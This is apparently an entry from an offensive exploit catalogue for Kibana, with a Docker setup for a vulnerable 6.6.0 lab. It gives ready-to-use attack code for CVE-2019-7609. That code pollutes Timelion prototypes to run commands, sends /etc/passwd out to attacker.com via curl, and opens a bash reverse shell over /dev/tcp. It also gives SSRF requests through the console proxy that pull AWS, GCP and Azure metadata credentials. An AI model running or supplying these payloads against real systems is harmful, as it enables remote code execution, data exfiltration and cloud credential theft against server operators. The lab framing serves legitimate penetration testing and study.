---
comment: "Kibana is the Elasticsearch visualization and management frontend. Two exploitation\n\
  paths are well-documented:\n\n1. CVE-2019-7609 (CVSS 8.1): Prototype pollution in\
  \ the Timelion visualization parser\n   allows any authenticated user to set Node.js\
  \ environment variables via the\n   __proto__.env chain. Setting NODE_OPTIONS=--require\
  \ /proc/self/environ causes\n   a Kibana backend worker process to execute an attacker-controlled\
  \ JavaScript\n   payload stored in a second polluted environment variable when it\
  \ restarts.\n   Navigate to Canvas after setting the Timelion expression to trigger\
  \ the worker restart.\n   Affects Kibana < 5.6.15 and < 6.6.1.\n\n2. Console proxy\
  \ SSRF (authenticated): Kibana's Dev Tools console exposes\n   /api/console/proxy\
  \ which forwards requests to Elasticsearch and optionally other\n   internal endpoints.\
  \ No CVE \u2014 built-in feature available in all versions.\n"
docker:
  compose: "services:\n  elasticsearch:\n    image: docker.elastic.co/elasticsearch/elasticsearch:6.6.0\n\
    \    environment:\n      - discovery.type=single-node\n      - xpack.security.enabled=false\n\
    \    ports:\n      - \"9200:9200\"\n  kibana:\n    image: docker.elastic.co/kibana/kibana:6.6.0\n\
    \    ports:\n      - \"5601:5601\"\n    environment:\n      ELASTICSEARCH_URL:\
    \ http://elasticsearch:9200\n    depends_on:\n      - elasticsearch\n"
  note: 'Starts Kibana 6.6.0 (vulnerable to CVE-2019-7609) connected to Elasticsearch
    6.6.0.

    Access Kibana at `http://localhost:5601`. No login required by default.

    Navigate to Visualize > Create new visualization > Timelion to enter the payload.

    After setting the Timelion expression, navigate to `/app/canvas` to trigger the
    worker

    restart. Run `docker compose up -d && sleep 30` before browsing.

    '
functions:
  file-read:
  - code: |
      # CVE-2019-7609: read a file via Timelion prototype pollution (write output via curl)
      # The payload reads /etc/passwd and sends it to the attacker's HTTP server
      curl -s -X POST "http://victim.com:5601/api/timelion/run" \
        -H "Content-Type: application/json" \
        -H "kbn-xsrf: true" \
        -d '{
          "sheet": [".es(*).props(label.__proto__.env.AAAA='\''require(\"child_process\").exec(\"curl -s http://attacker.com:8888/?q=$(cat /etc/passwd|base64 -w0)\");//'\'').props(label.__proto__.env.NODE_OPTIONS='\''--require /proc/self/environ'\'')"],
          "time": {"from":"now-1m","to":"now","interval":"auto","timezone":"UTC"}
        }'
      curl -s "http://victim.com:5601/app/canvas" -H "kbn-xsrf: true" > /dev/null
      # Listen on the attacker machine: python3 -m http.server 8888
      # Decode received base64: echo <base64> | base64 -d
    comment: |
      CVE-2019-7609: exfiltrates a file by base64-encoding it and sending it to an
      attacker-controlled HTTP server via curl executed in the Node.js worker context.
      Requires curl on the Kibana host and outbound HTTP access.
      Alternatively, write the file content to /tmp/out.txt and retrieve it via
      the reverse-shell entry.
    contexts:
      authenticated:
    version: |
      < 5.6.15 / < 6.6.1
  rce:
  - blind: false
    code: "# CVE-2019-7609: prototype pollution via Timelion \u2192 Node.js worker\
      \ RCE\n# Step 1: navigate to http://victim.com:5601/app/timelion and enter this\
      \ expression:\n#\n# .es(*).props(label.__proto__.env.AAAA='require(\"child_process\"\
      ).exec(\"id>/tmp/pwned\");//')\n# .props(label.__proto__.env.NODE_OPTIONS='--require\
      \ /proc/self/environ')\n#\n# Step 2: click the Run button (the expression may\
      \ return an error \u2014 that is expected)\n# Step 3: navigate to http://victim.com:5601/app/canvas\
      \ to trigger the worker restart\n# The worker inherits the polluted environment\
      \ and requires /proc/self/environ,\n# executing the AAAA variable value as JavaScript.\n\
      #\n# Automated via curl (requires a valid session cookie / API key):\ncurl -s\
      \ -X POST \"http://victim.com:5601/api/timelion/run\" \\\n  -H \"Content-Type:\
      \ application/json\" \\\n  -H \"kbn-xsrf: true\" \\\n  -d '{\n    \"sheet\"\
      : [\".es(*).props(label.__proto__.env.AAAA='\\''require(\\\"child_process\\\"\
      ).exec(\\\"id>/tmp/pwned\\\");//'\\'').props(label.__proto__.env.NODE_OPTIONS='\\\
      ''--require /proc/self/environ'\\'')\"],\n    \"time\": {\"from\":\"now-1m\"\
      ,\"to\":\"now\",\"interval\":\"auto\",\"timezone\":\"UTC\"}\n  }'\n\n# Then\
      \ trigger the canvas worker restart:\ncurl -s \"http://victim.com:5601/app/canvas\"\
      \ -H \"kbn-xsrf: true\" > /dev/null\n"
    comment: "CVE-2019-7609: the Timelion expression parser in Kibana uses a custom\
      \ DSL that\nallows traversing JavaScript prototypes via .props(). Setting label.__proto__.env\n\
      pollutes the environment of Node.js worker processes.\nNODE_OPTIONS=--require\
      \ /proc/self/environ instructs Node to require /proc/self/environ\nas a module\
      \ on next load. /proc/self/environ contains AAAA=<JS code>;//, which Node.js\n\
      executes before encountering binary null bytes.\nCommand output goes to the\
      \ target filesystem \u2014 confirm via a DNS/HTTP callback\nor use the reverse-shell\
      \ entry for interactive access.\nRef: https://www.exploit-db.com/exploits/49784\n\
      nuclei: CVE-2019-7609\n"
    contexts:
      authenticated:
    version: |
      < 5.6.15 / < 6.6.1
  reverse-shell:
  - blind: true
    code: |
      # CVE-2019-7609: reverse bash shell via Timelion prototype pollution
      # Replace attacker.com and 12345 with your values, then URL-encode as needed.
      # Step 1: set the Timelion expression (in the UI or via API):
      LHOST="attacker.com"
      LPORT="12345"
      CMD="bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'"

      # Post the Timelion expression via the API:
      curl -s -X POST "http://victim.com:5601/api/timelion/run" \
        -H "Content-Type: application/json" \
        -H "kbn-xsrf: true" \
        -d "{
          \"sheet\": [\".es(*).props(label.__proto__.env.AAAA='require(\\\"child_process\\\").exec(\\\"${CMD}\\\");//').props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')\"],
          \"time\": {\"from\":\"now-1m\",\"to\":\"now\",\"interval\":\"auto\",\"timezone\":\"UTC\"}
        }"

      # Step 2: trigger the worker restart by visiting Canvas:
      curl -s "http://victim.com:5601/app/canvas" -H "kbn-xsrf: true" > /dev/null
    comment: "CVE-2019-7609: spawns a reverse bash shell via Timelion prototype pollution.\n\
      The shell runs as the Kibana process user (commonly kibana or root in containers).\n\
      The worker restart triggered by accessing Canvas executes the payload \u2014\
      \ the HTTP\nresponse for the Canvas request does not indicate whether the shell\
      \ fired.\nCheck the listener for the incoming connection within a few seconds.\n"
    contexts:
      authenticated:
    listener: tcp-server
    platform: linux
    tty: false
    version: |
      < 5.6.15 / < 6.6.1
  ssrf:
  - code: |
      # Dev Tools console proxy: forward HTTP requests to internal services
      # The /api/console/proxy endpoint proxies GET/POST to Elasticsearch and internal hosts

      # Probe AWS instance metadata (IMDSv1):
      curl -s -X GET \
        "http://victim.com:5601/api/console/proxy?path=http://169.254.169.254/latest/meta-data/iam/security-credentials/&method=GET" \
        -H "kbn-xsrf: true" \
        -H "Content-Type: application/json"

      # Enumerate Elasticsearch indices (internal ES cluster):
      curl -s -X GET \
        "http://victim.com:5601/api/console/proxy?path=_cat/indices&method=GET" \
        -H "kbn-xsrf: true"

      # Probe an arbitrary internal HTTP service:
      curl -s -X GET \
        "http://victim.com:5601/api/console/proxy?path=http://10.0.0.1:8080/api/v1/&method=GET" \
        -H "kbn-xsrf: true"
    comment: "Kibana's Dev Tools console at /app/dev_tools exposes /api/console/proxy,\
      \ which\nforwards HTTP requests server-side to the configured Elasticsearch\
      \ host by default,\nbut in many versions also accepts arbitrary target URLs\
      \ in the path parameter.\nThe full response body is returned inline in the API\
      \ response \u2014 making this a\nfull-read SSRF primitive for any authenticated\
      \ Kibana user.\nCloud metadata endpoints:\n- AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\
      - GCP:        http://metadata.google.internal/computeMetadata/v1/\n- Azure:\
      \      http://169.254.169.254/metadata/instance?api-version=2021-02-01\n"
    contexts:
      authenticated:
...
